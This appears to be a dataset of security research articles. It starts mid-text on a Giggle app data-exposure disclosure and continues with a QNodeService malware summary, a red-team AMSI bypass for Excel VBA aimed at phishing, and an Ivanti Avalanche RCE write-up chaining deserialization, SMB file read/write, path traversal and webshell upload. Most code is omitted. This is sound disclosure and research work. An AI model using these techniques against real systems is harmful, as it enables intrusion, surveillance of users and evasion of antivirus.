full analysis although we suspect issues could exist here. What we did look at was the UserList endpoint. This contained a filter parameter that contained my phone number, an operator (in this case “equals”) and a field (“mobile”). Presumably, this is how a user’s account details are fetched from the API. Of course, the obvious question is what would happen if we changed this filter parameter to be another phone number, changed the query to filter on another parameter such as user ID or user’s name or even would it remove the filter altogether, allowing us to view all accounts? First, we decided to change the filter query so it would filter based on the GUID of the original account which we received during our initial analysis. This brought back the original account details which included the user’s phone number, age (which was set to hidden) and a latitude and longitude. Request: Response: Having the phone number is bad enough, but we checked the returned latitude and longitude using Google Maps. Of course, this brought us to the very house I created the account in. This means an attacker that is completely unverified to the application can view the address and phone number of all users if they have the account ID. That is pretty bad in our opinion. Next, we wanted to be able to download the same details without knowing the account ID. Looking at the filter parameter, it’s clear to see there would be many ways to do this. We could remove the filter completely although that would reveal other accounts to us which we were trying to avoid seeing or we could change the query to show all accounts not matching a phone number. As a proof of concept, we decided to change the operator field from “equals” to “contains” and truncated the GUID. As this returned the same data, it should be obvious to see how the query could be trivially modified to expose all registered accounts with no prerequisite account knowledge. Request: Selfies! What about the supposed private picture that is used to verify accounts? They claim not to store? Behold my gargoylesq visage! If we look at the URL of the verification image (which we recovered by viewing network traffic in BurpSuite), we can see that the only thing that is required is the user GUID. As we can view the user GUID for every account (e.g. our test account) we can easily download the associated verification selfie. Although this is not terrible on it’s own, giggle do promise that this isn’t shared or published, and, given that it is available data stored along side my mobile number and geographical coordinates, with this information an attacker would know my address, my personal mobile number and what I look like. This is where we get to the really scary bit. Giggle has sections encouraging women to find support on abortion, abuse, addiction and relationships among other categories. The amount of available data means that with a phone number or name, an abusive partner would potentially be able to find the location of an abused woman and confirm her identity with the verification picture. There is also a section for sex workers, who, understandably would expect any app enabling them to advertise their work to have adequate privacy and security controls. Even if a user deletes their account, that data appears to still be saved by giggle. Account Deletion The final thing we looked at is whether a deleted account is actually deleted. We deleted the original account using the “Delete Account” button and tried to view the associated account details. Of course, they are still present and only set to Disabled meaning they are still stored by the system. Maybe accounts are deleted periodically. We would normally at this point reach out to the vendor and ask for clarification. This leads us to the next part of the story… Disclosure We wanted to let giggle know that this vuln existed and ask for some further details, not in the small part because it is so easy to exploit. In the midst of this we had done some digging on the origins of the app and found that the founder had a very public anti-trans agenda. However, much as this sickens us, our job is to protect users so we direct messaged giggle through twitter. Having had no response, we decided to send them a tweet asking them to check their DMs with their founder cc’d in, but with a caveat that we do not share or endorse her anti-trans views. That’s when we were dragged into a full on TERF War. Our public tweet had no engagement at all until Sall, the giggle founder, decided to share a screenshot of it with her followers. We have since been subject to a tirade of abuse. None of it about the security of the app. Interested parties are free to view our twitter and find the hundreds and hundreds of tweets in response to trying to disclose this vulnerability but we decided not to copy that into this post. Our founders have reached out to giggle and Sall and have been blocked following every attempt at contact. Our three year incorporated company has been accused of being a creepy bloke who runs private WhatsApp groups full of naked women, a front for the alt-left, making up the vuln to discredit Sall and her company and hypocrites for wanting to protect the data of users despite the apps founder having view that counter our own. Our company and I (a woman) have been accused of being a man, and therefore a misogynist multiple times. We have been told that as men (60% of Digital Interruption are women), we should not have a say on the safety of women and their personal data. Sadly, denial is not uncommon when trying to disclose. We are used to being ignored and even getting some pushback, but ultimately we feel it is our responsibility to persist and ensure the personal data of users is protected. What has been staggering is the viciousness of the gender critical and “pro-women” community and how quick they are to go on the attack with so little background information, a total disregard for the safety of users (in this case women in their own community) and seemingly no understanding of information security. Sall has several times said no vulnerabilities exists without letting us give her details, instead choosing to believe we’re making it up to hurt her reputation. Our hearts go out to the people who deal with this kind of abuse on a daily basis and we will continue to stand up for trans rights. Finally, what does this mean for the users of Giggle. Unfortunately, your location and phone number (and verification selfie) are open to the public. We recommend asking giggle to address these issues or asking them to delete your account. Note that using the “delete” button in the application is not enough. Disclosure timeline: 07/09/2020 : Reached out privately via Twitter DM 09/09/2020 : Publicly reached out via Twitter 09/09/2020 : Continued DM with giggle owner, Sall 09/09/2020 : DI_Security Twitter account blocked 09/09/2020 : JayHarris_Sec Twitter account blocked 09/09/2020 : Saskia asked Sall to reconsider ignoring us 09/09/2020 : ms__chief account blocked 09/09/2020 : Journalist contacted. Ignored by giggle 10/09/2020 : Giggle finally asked for more details 10/09/2020 : Vulnerability fixed"
086ada55-1b5b-5141-a0d5-b217744303eb,19-November,QNodeService stepped up its features while operated in widespread credential-theft campaigns,A new piece of malware has emerged linked to the crimeware matrix. The malware exfiltration of browsers and email services credentials against a range of potential targets. The group that operates this threat is unknown but likely operates from a West Asia country.,"Since mid-year 2020, a new piece of malware emerged in the cyber threat landscape. It seems to be linked to the crimeware matrix due its main purpose and use, which is exfiltration of browsers and email services credentials against a fairly extensive range of potential targets. The group that operates this threat is currently unknown for us (internally tracked as RedMoon ) but we know that it likely operates, at least for malware samples involving Italian assets, from a West Asia country and we noted it seems to be very focused on keeping their detection rates as low as possible. A variant of this threat was originally spotted by @malwrhunterteam on April 30, 2020 ( https://twitter.com/malwrhunterteam/status/1255840193745215489 ) and firstly analyzed by industry on May 14, 2020 ( https://blog.trendmicro.com/trendlabs-security-intelligence/qnodeservice-node-js-trojan-spread-via-covid-19-lure/ ) which dubbed it QNodeService referring to the use of Node.js as execution engine of the malicious script that represents the core of the malware. Recently Telsy Threat Intelligence Division observed variants of this malware to be operated against entities and individuals located in European countries. Download the full PDF report below: Check more related articles on our blog ."
0fd1852e-0444-5a2f-b437-ae3face2b28e,19-July-2019,Heap-based AMSI bypass for MS Excel VBA and others,This blog post describes how to bypass Microsoft's AMSI in Excel using VBA. AMSI is an Antimalware Scan Interface for MS Office and covers VBA code in MS Office documents. In the past several approaches have been published to bypass AMSI. This approach identifies crucial data on the heap and modifies it.,"This blog post describes how to bypass Microsoft's AMSI (Antimalware Scan Interface) in Excel using VBA (Visual Basic for Applications). In contrast to other bypasses this approach does not use hardcoded offsets or opcodes but identifies crucial data on the heap and modifies it. The idea of an heap-based bypass has been mentioned by other researchers before but at the time of writing this article no public PoC was available. This blog post will provide the reader with some insights into the AMSI implementation and a generic way to bypass it. Introduction Since Microsoft rolled out their AMSI implementation many writeups about bypassing the implemented mechanism have been released. Code White regularly conducts Red Team scenarios where phishing plays a great role. Phishing is often related to MS Office, in detail to malicious scripts written in VBA. As per Microsoft AMSI also covers VBA code placed into MS Office documents. This fact motivated some research performed earlier this year. It has been evaluated if and how AMSI can be defeated in an MS Office Excel environment. In the past several different approaches have been published to bypass AMSI. The following links contain information which were used as inspiration or reference: https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet also lists a lot of other writeups and implements a nice data-based approach https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/ AMSI Bypass for VBA The first article from the list above also mentions a heap-based approach. Independent from that writeup, Code White's approach used exactly that idea. During the time of writing this article there was no code publicly available which implements this idea. This was another motivation to write this blog post. Porting the bypass to MS Excel/VBA revealed some nice challenges which were to be solved. The following chapters show the evolution of Code White's implementation in a chronological way: Implementing our own AMSI Client in C to have a debugging platform Understanding how the AMSI API works Bypassing AMSI in our own client Porting this approach to VBA Improving the bypass Improving the bypass - making it production-ready Implementing our own AMSI Client In order to ease debugging we will implement our own small AMSI client in C which triggers a scan on the malicious string ‘amsiutils’. This string gets flagged as evil since some AMSI Bypasses of Matt Graeber used it. Scanning this simple string depicts a simple way to check if AMSI works at all and to verify if our bypass is functional. A ready-to-use AMSI client can be found on sinn3r's github . This code provided us a good starting point and also contained important hints, e.g. the pre-condition in the Local Group Policies. We will implement our test client using Microsoft Visual Studio Community 2017. In a first step, we end up with two functions, amsiInit() and amsiScan(), not to be confused with functions exported by amsi.dll. Later we will add another function amsiByPass() which does what its name suggests. See this gist for the final code including the bypass. Running the program generates the following output: This means our ‘amsiutils’ is considered as evil. Now we can proceed working on our bypass. Understanding AMSI Structures As promised we would like to do a heap-based bypass. But why heap-based? At first we have to understand that using the AMSI API requires initializing a so called AMSI Context (HAMSICONTEXT). This context must be initialized using the function AmsiInitialize(). Whenever we want to scan something, e.g. by calling AmsiScanBuffer(), we have to pass our context as first parameter. If the data behind this context is invalid the related AMSI functions will fail. This is what we are after, but let's talk about that later. Having a look at HAMSICONTEXT we will see that this type gets resolved by the pre-processor to the following: So what we got here is a pointer to a struct called ‘HAMSICONTEXT__’. Let's have a look where this pointer points to by printing the memory address of ‘amsiContext’ in our client. This will allow us to inspect its contents using windbg: The variable itself is located at address 0x16a144 (note we have 32-bit program here) and its content is 0x16c8b10, that's where it points to. At address 0x16c8b10 we see some memory starting with the ASCII characters ‘AMSI’ identifying a valid AMSI context. The output below the memory field is derived via ‘!address’ which prints the memory layout of the current process. There we can see that the address 0x16c8b10 is allocated to a region starting from 0x16c0000 to 0x16df0000 which is identified as Heap. Okay, that means AmsiInitialize() delivers us a pointer to a struct residing on the heap. A deeper look into AmsiInitialize() using IDA delivers some evidence for that: The function allocates 16 bytes (10h) using the COM-specific API CoTaskMemAlloc(). The latter is intended to be an abstraction layer for the heap. See here and here for details. After allocating the buffer the Magic Word 0x49534D41 is written to the beginning of the block, which is nothing more than our ‘AMSI’ in ASCII. It is noteworthy to say that an application cannot easily change this behavior. The content of the AMSI context will always be stored on the heap unless really sneaky things are done, like copying the context to somewhere else or implementing your own memory provider. This explains why Microsoft states in their API documentation, that the application is responsible to call AmsiUnitialize() when it is done with AMSI. This is because the client cannot (should not) free that memory and the process of cleaning up is performed by the AMSI library. Now we have understood that the AMSI Context is an important data structure it is always placed on the heap it always starts with the ASCII characters ‘AMSI’ In case our AMSI context is corrupt, functions like AmsiScanBuffer() will fail with a return value different from zero. But what does corrupt mean, how does AmsiScanBuffer() detect if the context is valid? Let's check that in IDA: The function does what we already spoilered in the beginning: The first four bytes of the AMSI Context are compared against the value ‘0x49534D41’. If the comparison fails, the function returns with 0x80070057 which does not equal 0 and tells something went wrong. Bypassing AMSI in our own AMSI Client Our heap-based approach assumes several things to finally depict a so called bypass: we have already code execution in the context of the AMSI client, e.g. by executing a VBA script The AMSI client (e.g. Excel) initializes the AMSI context only once and reuses this for every AMSI operation the AMSI client rates the checked payload in case of a failure of AmsiScanBuffer() as ‘not malicious The first point is not true for our test client but also not required because it depicts only a test vehicle which we can modify as desired. Especially the last point is important because we will try to mess up the one and only AMSI context available in the target process. If the failure of AmsiScanBuffer() leads to negative side effects, in worst case the program might crash, the bypass will not work. So our task is to iterate through the heap of the AMSI client process, look for chunks starting with ‘AMSI’ and mess this block up making all further AMSI operations fail. Microsoft provides a nice code example which walks through the heap using a couple of functions from kernel32.dll. Due to the fact that all the required information is present in user space one could do this task by parsing data structures in memory. Doing so would make the use of external functions obsolete but probably blow up our code so we decided to use the functions from the example above. After cutting the example down to the minimum functionality we need, we end up with a function amsiByPass() . So this code retrieves the heap of the current process, iterates through it and looks at every chunk tagged as 'busy'. Within these busy chunks we check if the first bytes match our magic pattern ‘AMSI’ and if so overwrite it with some garbage. The expectation is now that our payload is no longer flagged as malicious but the AmsiScanBuffer() function should return with a failure. Let's check that: Okay, that's exactly what we expected. Are we done? No, not yet as we promised to provide an AMSI bypass for EXCEL/VBA so let's move on.. Bypassing AMSI in Excel using VBA Now we will dive into the strange world of VBA. We used Microsoft Excel for Office 365 MSO (16.0.11727.20222) 32-bit for our testing. After having written a basic POC in C we have to port this POC to VBA. VBA supports importing arbitrary external functions from DLLs so using our Heap APIs should be no problem. As far as we understood VBA, it does not allow pointer arithmetic or direct memory access. This problem can be resolved by importing a function which allows copying data from arbitrary memory locations into VBA variables. A very common function to perform this task is RtlMoveMemory() . After some code fiddling we came up with the following code . As you can see we put some time measurement around the main loop. The number of rounds the loop may take can be several hundred thousand iterations and in addition with the poor VBA performance we expected a significant amount of time the bypass will take. Time is a crucial thing in a real attack scenario. If our phishing victim opens a malicious Excel sheet it is not acceptable that the embedded script blocks the execution for let's say more than one or two seconds. At least after 5 seconds of perceived unresponsiveness of the application a human will get impatient and do things like trying to close Excel, which is not what we want. So let's see how long the bypass will take. To be honest, we did not expect what was happening. The result was difficult to reproduce but the measured runtime varied from 15 minutes to endless. In some rare cases Excel was closed after some minutes without any further notice. This was probably because it was unresponsive for too long. However, this isn't really something we can use in a real scenario. Okay so what went wrong here? Is VBA really that slow? Yes, it is some orders of magnitude slower than our C code, but that does not explain what we experienced. Microsoft gives some internal details on how AMSI is implemented in Excel. It turns out that Excel uses another strategy as e.g. PowerShell does. The latter more or less sends the whole script to AmsiScanBuffer(). Excel implements a little smarter approach which is based on so called triggers. Microsoft considers pure VBA code to be harmless until the point when imports come into play. That's exactly what we do - importing functions from external DLLs. Some of these imports are treated as potentially dangerous and their call including all parameters are put into a ring buffer which is sent to AMSI. This gives AV solutions like MS defender the opportunity to check data behind addresses which of course makes sense. Let's see what data is sent to the AMSI API in our explicit case by breaking on AmsiScanBuffer using windbg: As we can see the ring buffer contains all functions we imported including their parameter values. Our Windows 10 System has MS Defender installed and activated. So every call to AmsiScanBuffer() will bother our friend MS Defender. AMSI is implemented as In-process COM in the first place. But to finally communicate with other AV solutions it has to transport data out of process and perform a context switch. This can be seen on the next architecture overview provided by MS: Source: https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps The little green block on the bottom of the figure shows that our process (Excel) indirectly communicates via rpc with Defender. Hmm... Okay so this is done several 100k times, which is just too much and explains the long runtime. To provide some more evidence we repeat the bypass with Defender switched off, which should significantly speed up our bypass. In addition to that we monitor the amount of calls to AmsiScanBuffer() so we can get an impression how often it is called. The same loop with Defender disabled took something between one and two minutes: In a separate run we check the amount of calls to AmsiScanBuffer() using windbg: AmsiScanBuffer() is called 124624 times (0x10000000 - 0xffe1930) which is roughly the amount of iterations our loop did. That's a lot and underlines our assumptions that AMSI is just called very often. So we understood what is going on, but currently there seems no workaround available to solve our runtime problem. Giving up now? Not yet... Improving AMSI Bypass in Excel As described in the chapter above our current approach is much too slow to be used in a real scenario. So what can we do to improve this situation? One of the functions we imported is RtlMoveMemory() which is as mentioned earlier used by a lot of malware. Monitoring this function would make a lot of sense and it might be considered as trigger. Let's verify that by just removing the call to CopyMem (the alias for RtlMoveMemory) and see what happens. This prevents our bypass from working but it might give us some insight. The runtime is now at 0.8 seconds. Wow okay, this really made a change. It shall be noted that in this configuration we even walk through the whole heap. Due to the missing call to RtlMoveMemory() we will not find our pattern. After we identified our bottleneck, what can we do? We will have to find an alternative method to access raw memory which is not treated as trigger by Excel. Some random Googling revealed the following function: CryptBinaryToStringA() which is part of crypt32.dll. The latter should be present on most Windows systems and thus it should be okay to import it. The function is intended to convert strings from one format to another but it can also be used to just simply copy bytes from an arbitrary memory position we specify. Cool, that's exactly what we are after! In order to abuse this function for our purpose we call it like that to read the lpData field from the Process Heap Entry structure: The input parameter from left to right explained: phe.lpData is the source we want to copy data from, ByVal 4 is the length of bytes we want to copy (lpData is 32-bit on our 32-bit Excel) ByVal 2 means we want to copy raw binary ( CRYPT_STRING_BINARY ) ByVal VarPtr(magicWord) is the target we want to copy that memory to (our VBA variable magicWord) the last parameter (ByVal VarPtr(bytesWritten)) tells us how many bytes were really copied So let's replace all occurrences of RtlMoveMemory() with CryptBinaryToStringA() and check again how long our bypass takes. You can find an updated version of the source code right here . Our loop now takes about four seconds to finish, that is still much but it finished and it told us that it found the pattern we are looking after. Let's see how many times Excel calls AmsiScanBuffer() now with this version: Oh my... Excel did not call AmsiScanBuffer() at all. So this means as long as there is no trigger in our code, nothing is sent to AMSI. Or the other way around: As soon as we use one single trigger function, Excel will send all calls to AMSI. Good to know... This is the first time we can really verify if the bypass works. So let's look for some code which triggers AMSI from VBA. Iliya Dafchev shows some port of an older AMSI Bypass to VBA which gets flagged by AMSI itself in the first place. Perfect, we will put this code into a function called triggerAMSI() and use it as positive test: After running it Excel complains as expected with a warning and just closes our current instance of Excel: AMSI Alert by Excel - sorry for the German! Putting our bypass and our positive test together we get the following function: Hopes are high, that the message box containing “we survived” gets displayed because we killed AMSI before triggering it. Great, our bypass seems to work. So let's put this into our real phishing campaign. Uhm.. just wait, how long did the whole thing take? four seconds? Repeated execution of the bypass even showed runtimes greater than ten seconds. Oh no, this is still too much. Giving up now? Not yet... Improving AMSI Bypass in Excel - continued In the last chapter we improved our AMSI bypass from infinite runtime to ten seconds or below. This seems to be still too much for a real campaign (our opinion). So what can we do to speed up the whole thing one more time? The loop takes some 100k iterations which is done in C in no time. Defender is completely out of the game. So our current runtime seems to be a pure result of the bad VBA performance. To be fair, these kind of things we are currently trying to do are not a typical VBA task so let's blame us instead of Excel for doing crazy stuff... Anyway, what can we do now? Programming C in VBA is not an option, but what about invoking some shellcode? As long as we can import arbitrary functions the execution of shellcode should not be a problem. This code snippet shows an example how to do that within VBA. The next step is converting our VBA code (or more our initial C code) into assembly language, that is, into shellcode. Everyone who ever wrote some pieces of shellcode and wanted to call functions from DLLs knows that the absolute addresses of these functions are not known during the time the shellcode gets assembled. This means we have to implement a mechanism like GetProcAddress() to lookup the addresses of required functions during runtime. How to do this without any library support is well understood and extensively documented so we will not go into details here. Implementing this part of the shellcode is left as an excercise for the reader. Of course there are many ready to use code snippets which should do the job, but we decided to implement the shellcode on our own. Why? Because it is fun and self written shellcode should be unlikely to get caught by AV solutions. The main loop of our AMSI bypass in assembly can be found here . The structure ShellCodeEnvironment holds some important information like the looked up address of our HeapWalk() and GetProcessHeaps() function. The rest of the loop should be straight forward... So putting everything together we generate our shellcode, put it into our VBA code and start it from there as new thread. Of course we measure the runtime again: This time it is only 0.02 seconds! We think this result is more than acceptable. The runtime may vary depending on the processor load or the total heap size but it should be significantly below one second which was our initial goal. Summary We hope you enjoyed reading this blog post. We showed the feasibility of a heap-based AMSI bypass for VBA. The same approach, with slight adaptions, also works for PowerShell and .Net 4.8. The latter also comes with AMSI support integrated in its Common Language Runtime. As per Microsoft AMSI is not a security boundary so we do not expect that much reaction but are still curious if MS will develop some detection mechanisms for this idea."
a258266e-d8ed-5f3e-a17b-a7a7ecce7f9b,08-September-2022,Riding the InfoRail to Exploit Ivanti Avalanche – Part 2,Ivanti Avalanche allows enterprises to manage mobile device and supply chain mobility solutions. I reversed the Avalanche custom InfoRail protocol to find multiple vulnerabilities in the mobile device management tool. I was able to discover 20 critical and high severity vulnerabilities in Avalanche.,"In my first blog post covering bugs in Ivanti Avalanche, I covered how I reversed the Avalanche custom InfoRail protocol, which allowed me to communicate with multiple services deployed within this product. This allowed me to find multiple vulnerabilities in the popular mobile device management (MDM) tool. If you aren’t familiar with it, Ivanti Avalanche allows enterprises to manage mobile device and supply chain mobility solutions. That’s why the bugs discussed here could be used by threat actors to disrupt centrally managed Android, iOS and Windows devices. To refresh your memory, the following vulnerabilities were presented in the previous post: · Five XStream insecure deserialization issues, where deserialization was performed on the level of message handling. · A race condition leading to authentication bypass, wherein I abused a weakness in the protocol and the communication between services. This post is a continuation of that research. By understanding the expanded attack surface exposed by the InfoRail protocol, I was able to discover an additional 20 critical and high severity vulnerabilities. This blog post takes a detailed look at three of my favorite vulnerabilities, two of which have a rating of CVSS 9.8: · CVE-2022-36971 – Insecure deserialization. · CVE-2021-42133 – Arbitrary file write/read through the SMB server. · CVE-2022-36981 – Path traversal, delivered with a fun authentication bypass. Each of these three vulnerabilities leads to remote code execution as SYSTEM. CVE-2022-36971: A Tricky Insecure Deserialization I discovered the first vulnerability when I came across an interesting class named JwtTokenUtility , which defines a non-default constructor that could be a potential target: At [1], the function base64-decodes one of the arguments. At [2], it checks if the publicOnly argument is true. If not, it deserializes the base64 decoded argument at [3]. This looks like a possible insecure deserialization sink. In addition, it is invoked from many locations within the codebase. The following screenshot illustrates several instances where it is invoked with the first argument set to false : Figure 1 - Example invocations of JwtTokenUtility non-default constructor It turned out that most of these potential vectors require control over the SQL database. The serialized object is retrieved from the database, and I found no direct way to modify this value. Luckily, there are two services with a more direct attack vector: the Printer Device Server and the Smart Device Server. The exploitation of both services is almost identical. We will focus on the Printer Device Server (PDS). Let’s have a look at the PDS AmcConfigDirector.createAccessTokenGenerator method: At [1], it uses acctApi.getGlobal to retrieve an object that implements IGlobal . At [2], it retrieves the pkk string by calling global.getAccessKeyPair . At [3], it decrypts the pkk string by calling PasswordUtils.decryptPassword . We are not going to analyze this decryption routine. This decryption function implements a fixed algorithm with a hardcoded key, thus the attacker can easily perform the encryption or decryption on their own. At [4], it invokes the vulnerable JwtTokenUtility constructor, passing the pkk string as an argument. At this point, we are aware that there is potential for abusing the non-default JwtTokenUtility constructor. However, we are missing two things: -- How can we control the pkk string? -- How can we reach createAccessTokenGenerator ? Let’s start with the control of the pkk string. Controlling the value of pkk To begin, we know that: -- The code retrieves an object to assign to the global variable. This object implements IGlobal . -- It calls the global.getAccessKeyPair getter to retrieve pkk . There is a Global class that appears to control the PDS service global settings. It implements the IGlobal interface and both the getter and the setter for the accessKeyPair member, so this is probably the class we’re looking for. Next, we must look for corresponding setAccessKeyPair setter calls. Such a call can be found in the AmcConfigDirector.processServerProfile method. At [1], processServerProfile accepts the config argument, which is of type PrinterAgentConfig . At [2], it retrieves a list of PropertyPayload objects by calling config.getPayload . At [3], the code iterates over the list of PropertyPayload objects. At [4], there is a switch statement based on the property.name field. At [5], the code checks to see if property.name is equal to the string ""webfs.ac.ppk"" . If so, it calls setAccessKeyPair at [6]. So, the AmcConfigDirector.processServerProfile method can be used to control the pkk value. Finally, we note that this method can be invoked remotely through a ServerConfigHandler InfoRail message: At [1], we see that this message type can be accessed through the subcategory 1000000 (see first blog post - Message Processing and Subcategories section). At [2], the main processMessage method is defined. It will be called during message handling. At [3], the code retrieves the message payload. At [4], it calls the second processMessage method. At [5], it deserializes the payload and casts it to the PrinterAgentConfig type. At [6], it calls processServerProfile and provides the deserialized config object as an argument. Success! We can now deliver our own configuration through the ServerConfigHandler method of the PDS server. This method can be invoked through the InfoRail protocol. Next, we need to get familiar with the PrinterAgentConfig class to prepare the appropriate serialized object. It has a member called payload , which is of type List<PropertyPayload> . PropertyPayload has two members that are interesting for us: name and value . Recall that the processServerProfile method does the following: -- Iterates through the list of PropertyPayload objects with a for loop. -- Executes switch statement based on PropertyPayload.name . -- Sets values based on PropertyPayload.value . With this in mind, we can understand how to deliver a serialized object and control the pkk variable. We have to prepare an appropriate gadget (we can use the Ysoserial C3P0 or CommonsBeanutils1 gadgets), encrypt it (decryption will be handled by the PasswordUtils.decryptPassword method) and deliver through the InfoRail protocol. The properties of the InfoRail message should be as follows: -- Message subcategory: 1000000. -- InfoRail distribution list address: 255.3.5.15 (PDS server). Here is an example payload: The first step of the exploitation is completed. Next, we must find a way to call the createAccessTokenGenerator function. Triggering the Deserialization Because the full flow that leads to the invocation of createAccessTokenGenerator is extensive, I will omit some of the more tedious details. We will instead focus on the InfoRail message that allows us to trigger the deserialization via the needFullConfigSync function. Be aware that the PDS server frequently performs synchronization operations, but typically does not perform a synchronization of the full configuration. By calling needFullConfigSync , a full synchronization will be performed, leading to execution of doPostDeploymentCleanup : At [1], the code invokes our target method, createAccessTokenGenerator . The following snippet presents the NotificationHandler message, which calls the needFullConfigSync method: At [1], the message subcategory is defined as 2200. At [2], the main processMessage method is defined. At [3], the payload is deserialized and casted to the NotifyUpdate type (variable nu ). At [4], the code iterates through the entries of the NotifyUpdateEntry object that was obtained from nu.getEntries . At [5], [6], and [7], the code checks to see if entry.ObjectType is equal to 61, 64, or 59. If one of the conditions is true, the code sets the universalDeployment variable to true value at [8], [9], or [10], so that needFullConfigSync will be called at [11]. The last step is to create an appropriate serialized message object. An example payload is presented below. Here, the objectType field is equal to 61. The attacker must send this payload through a message with the following properties: -- Message subcategory: 2200. -- InfoRail distribution list address: 255.3.5.15 (PDS server). To summarize, we must send two different InfoRail messages to exploit this deserialization issue. The first message is to invoke ServerConfigHandler , which delivers a serialized pkk string. The second message is to invoke NotificationHandler , to trigger the insecure deserialization of the pkk value. The final result is a nice pre-auth remote code execution as SYSTEM. CVE-2021-42133: One Vuln to Rule Them All - Arbitrary File Read and Write Ivanti Avalanche has a File Store functionality, which can be used to upload files of various types. This functionality has been already abused in the past, in CVE-2021-42125 , where an administrative user could: -- Use the web application to change the location of the File Storage and point it to the web root. -- Upload a file of any extension, such as a JSP webshell, through the web-based functionality. -- Use the webshell to get code execution. The File Store configuration operations are performed through the Enterprise Server, and they can be invoked through InfoRail messages. I quickly discovered three interesting properties of the File Store: These properties allow an attacker to freely exchange files between their SMB server and the Ivanti Avalanche local file system. In order to modify the File Store configuration, the attacker needs to send a SetFileStoreConfig message: At [1], the subcategory is defined as 1501. At [2], the standard Enterprise Server processMessage method is defined. The implementation of message processing is a little bit different in the Enterprise Server, although the underlying idea is the same as in previous examples. At [3] and [4], the method saves the new configuration values. The only thing that we must know about the saveConfig method is that it overwrites all the properties with the new ones provided in the serialized payload. Moreover, some of the properties, such as the username and password for the SMB share, are encrypted in the same manner as in the previously described deserialization vulnerability. To sum up this part, we must send an InfoRail message with the following properties: --Message subcategory: 1501. --Message distribution list: 255.3.2.5 (Enterprise Server). Below is a fragment of an example payload, which sets the File Store path to an attacker-controlled SMB server: Arbitrary File Read Scenario The whole Arbitrary File Read scenario can be summarized in the following picture: Figure 2 - Example scenario for the Arbitrary File Read exploitation The following screenshot presents an example exploitation of this scenario: Figure 3 - Exploitation of the Arbitrary File Read scenario As shown, the exploit is targeting the main Ivanti Avalanche directory: C:\Program Files\Wavelink\Avalanche . The following screenshot presents the exploitation results. Files from the Avalanche main directory were gradually copied to the attacker’s server: Figure 4 - Exploitation of the Arbitrary File Read scenario - results Arbitrary File Write Scenario The following screenshot presents the Arbitrary File Write scenario: Figure 5 - Example scenario for the Arbitrary File Write scenario The following screenshot presents an example exploitation attempt. It uploads a file named poc-upload.jsp to C:\Program Files\Wavelink\Avalanche\Web\webapps\ROOT : Figure 6 - Exploitation of the Arbitrary File Write scenario Finally, one can use the uploaded webshell to execute arbitrary commands. Figure 7 - Executing arbitrary code via the webshell CVE-2022-36981: Path Traversal in File Upload, Plus Authentication Bypass We made it to the final vulnerability we will discuss today. This time, we will exploit a path traversal vulnerability in the Avalanche Smart Device Server, which listens on port TCP 8888 by default. However, InfoRail will play a role during the authentication bypass that allows us to reach the vulnerable code. Path Traversal in File Upload Our analysis begins with examining the uploadFile method. At [1], the endpoint path is defined. The path contains two arguments: uuid and targetbasename . At [2], the doUploadFile method is called. Let’s start with the second part of the doUploadFile method, as I want to save the authentication analysis for later in this section. At [1], the uploadPath string is obtained by calling getUploadFilePath . This method accepts two controllable input arguments: uuid and baseFileName . At [2], the method instantiates a File object based on uploadPath . At [3], the method invokes writeToFile , passing the attacker-controlled input stream together with the File object. We will now analyze the crucial getUploadFilePath method, as this is the method that composes the destination path. At [1], it constructs deviceRoot as an object of type File . The parameters passed to the constructor are the hardcoded path obtained from getCachePath() and the attacker-controllable uuid value. As shown above, uuid is not subjected to any validation, so we can perform path traversal here. At [2], the code verifies that the deviceRoot directory exists. From here we see that uuid is intended to specify a directory. If the directory does not exist, the code creates it at [3]. At [4], it validates the attacker-controlled baseFileName against a regular expression. If the validation fails, baseFileName is reassigned at [5]. At [6], it creates a new filename fn , based on the current datetime, an integer value, and baseFileName . At [7], it instantiates a new object of type File . The path for this File object is composed from uuid and fn . After ensuring that the file does not already exist, the file path is returned at [8]. After analyzing this method, we can draw two conclusions: -- The uuid parameter is not validated to guard against path traversal sequences. An attacker can use this to escape to a different directory. -- The extension of baseFileName is not validated. An attacker can use this to upload a file with any extension, though the filename will be prepended with a datetime and an integer. Ultimately, when doUploadFile calls writeToFile , it will create a new file with this name and write the attacker-controlled input stream to the file. This makes it seem that we can exploit this as a path traversal vulnerability and write an arbitrary file to the filesystem. However, there are two major obstacles that will be presented in the next section. Authentication and Additional UUID Verification Now that we’ve covered the second part, let’s go back and analyze the first part of the doUploadFile method. At [1], the code retrieves the mysterious testFlags . At [2], it validates the length of the uuid , to ensure it is at least 5 characters long. At [3], it performs an authorization check (perhaps better thought of as an authentication check) by calling isAuthorized . This method accepts uuid , credentials ( authorization ), and testFlags . At [4], the code retrieves the deviceId based on the provided uuid . At [5], the code checks to see if any device was retrieved. If not, it checks for a specific value in testFlags at [6]. If this second check is also not successful, the code raises an exception. At [7], it calls allowUpload to perform one additional check. However, this final check has nothing to do with validating uuid . It only verifies the amount of available disk space, and this should not pose any difficulties for us. We can spot two potential roadblocks: -- There is an authentication check. -- There is a check on the value of uuid , in that it must map to a known deviceId . However, we can bypass this check if we could get control over testFlags . If testFlags & 0x100 is not equal to 0, the exception will not be thrown, and execution will proceed. Let’s analyze the most important fragments of the isAuthorized method: At [1], the method retrieves enrollmentId , found within the token submitted by the requester. At [2], it tries to retrieve the enrollment object from the database, based on enrollmentId . At [3], it checks to see if enrollment was retrieved. Supposing that enrollment was not retrieved successfully, the code checks for a particular value in testFlags at [4]. If not, it will return false at [6]. But if the relevant value is found in testFlags , the authentication routine will return true at [5], even though the requester’s authorization token did not contain a valid enrollmentId . Note that this method also checks an enrollment password, although that part is not important for our purposes. Here as well, testFlags can also be used to bypass the relevant check. Hence, if we can control testFlags , neither the authentication nor the uuid validation will cause any further trouble for us. Here is where InfoRail comes into play. It turns out that the Smart Device Server AgentTaskHandler message can be used to modify testFlags : At [1], it retrieves flagsToSet from the sds.modflags.set property. At [2], it obtains the Config Directory API interface. At [3], it uses flagsToSet to calculate the new flags value. At [4], it saves the new flag value. To sum up, an attacker can control testFlags , and use this to bypass both the authentication check and the uuid check. Exploitation Exploitation includes two steps. 1) Set testFlags to bypass the authentication and the uuid check. To modify the testFlags , the attacker must send an InfoRail message with the following parameters: -- Message subcategory: 2500. -- Distribution list: 255.3.2.17 (SDS server). -- Payload: 2) Exploit the path Traversal through a web request The path traversal can be exploited with an HTTP Request, as in the following example: The response will return the name of the uploaded webshell: Finally, an attacker can use the uploaded JSP webshell for remote code execution as SYSTEM. Figure 8 - Remote 